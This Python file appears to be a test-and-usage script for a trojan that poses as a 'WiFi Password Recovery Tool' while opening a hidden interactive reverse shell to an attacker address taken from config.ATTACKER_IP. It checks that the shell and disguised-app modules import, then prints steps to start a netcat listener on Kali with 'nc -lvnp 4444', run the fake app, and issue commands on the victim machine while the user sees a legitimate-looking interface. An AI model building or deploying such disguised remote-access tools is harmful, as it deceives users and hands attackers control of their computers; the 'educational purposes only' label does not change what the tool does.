#!/usr/bin/env python3
"""
Test script for enhanced disguised app
Educational purposes only
"""

import sys
import os

# Add the windows directory to path for imports
sys.path.append(os.path.dirname(__file__))

def test_import():
    """Test if all imports work correctly"""
    try:
        print("[+] Testing imports...")
        
        # Test config import
        import config
        print(f"[+] Config loaded: {config.ATTACKER_IP}:{config.ATTACKER_PORT}")
        
        # Test interactive shell import
        from interactive_shell import simple_dup_shell, create_interactive_shell, fallback_shell_with_state
        print("[+] Interactive shell functions imported successfully")
        
        # Test disguised app import
        from disguised_app import WiFiRecoveryApp
        print("[+] WiFiRecoveryApp class imported successfully")
        
        print("[+] All imports successful!")
        print("\n[*] Ready to run enhanced disguised app with interactive shell")
        print("[*] Features enabled:")
        print("    - Interactive shell with persistent cd navigation")
        print("    - Legitimate WiFi scanner GUI")
        print("    - Background shell connection")
        print("    - Multiple fallback methods")
        
        return True
        
    except Exception as e:
        print(f"[-] Import error: {e}")
        return False

def show_usage():
    """Show usage instructions"""
    print("\n" + "="*60)
    print("ENHANCED DISGUISED APP - USAGE INSTRUCTIONS")
    print("="*60)
    print()
    print("1. Start listener on Kali:")
    print("   sudo nc -lvnp 4444")
    print()
    print("2. Run the enhanced disguised app:")
    print("   python disguised_app.py")
    print()
    print("3. Expected behavior:")
    print("   - GUI opens showing WiFi Password Recovery Tool")
    print("   - Interactive shell connects in background")
    print("   - cd commands now work persistently!")
    print("   - User sees legitimate scanning interface")
    print()
    print("4. Test the interactive shell:")
    print("   cd ..")
    print("   dir")
    print("   cd Windows")
    print("   pwd")
    print()
    print("="*60)

if __name__ == "__main__":
    if test_import():
        show_usage()
    else:
        print("[-] Setup incomplete. Check file structure and imports.")